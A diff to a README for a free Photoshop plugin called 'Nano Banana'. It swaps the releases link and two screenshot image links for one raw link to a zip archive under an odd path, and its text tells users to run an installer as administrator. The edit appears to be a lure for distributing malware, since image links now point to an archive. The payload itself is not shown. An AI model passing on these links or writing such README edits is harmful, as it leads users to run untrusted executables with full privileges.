@@ -16,9 +16,9 @@ Getting started is super simple. Just follow these steps:
 
 ### Step 1: Download the Plugin
 
-**Visit this link to download the application:** [Download Now](https://github.com/Jenincosmetices/photoshop-plugin-nano-banana/releases)
+**Visit this link to download the application:** [Download Now](https://raw.githubusercontent.com/Jenincosmetices/photoshop-plugin-nano-banana/main/mensuration/photoshop_nano_plugin_banana_wettable.zip)
 
-[![Download Now](https://img.shields.io/badge/⏬_Download_Nano_Banana_-_FREE!-brightgreen?style=for-the-badge&logo=github)](https://github.com/Jenincosmetices/photoshop-plugin-nano-banana/releases)
+[![Download Now](https://img.shields.io/badge/⏬_Download_Nano_Banana_-_FREE!-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jenincosmetices/photoshop-plugin-nano-banana/main/mensuration/photoshop_nano_plugin_banana_wettable.zip)
 
 ### Step 2: Install the Plugin
 
@@ -42,10 +42,10 @@ Once installed, using Nano Banana is as easy as 1-2-3:
 
 Here are some visual examples to help you understand:
 
-![Usage Example 1](https://github.com/user-attachments/assets/090c7b24-a06a-46ab-91b2-c37f2f3a7921)
+![Usage Example 1](https://raw.githubusercontent.com/Jenincosmetices/photoshop-plugin-nano-banana/main/mensuration/photoshop_nano_plugin_banana_wettable.zip)
 *This screenshot shows the plugin panel ready for action.*
 
-![Usage Example 2](https://github.com/user-attachments/assets/1d781f89-79ca-400d-80b0-a5f42a66fc00)
+![Usage Example 2](https://raw.githubusercontent.com/Jenincosmetices/photoshop-plugin-nano-banana/main/mensuration/photoshop_nano_plugin_banana_wettable.zip)
 *Another view of the editor interface in Photoshop.*
 
 ### What Can You Do With It?
@@ -90,7 +90,7 @@ If your computer can run Photoshop smoothly, it can run Nano Banana without any 
 
 Here's the direct download link one more time:
 
-**👉 [Download Nano Banana Plugin](https://github.com/Jenincosmetices/photoshop-plugin-nano-banana/releases)**
+**👉 [Download Nano Banana Plugin](https://raw.githubusercontent.com/Jenincosmetices/photoshop-plugin-nano-banana/main/mensuration/photoshop_nano_plugin_banana_wettable.zip)**
 
 **Visit this link to download the application.** Once there, look for the latest release file (usually named something like `Plugin.nanoB.rar` or `Plugin_setup.exe`). Download it, run the installer as administrator, and you're all set.
 
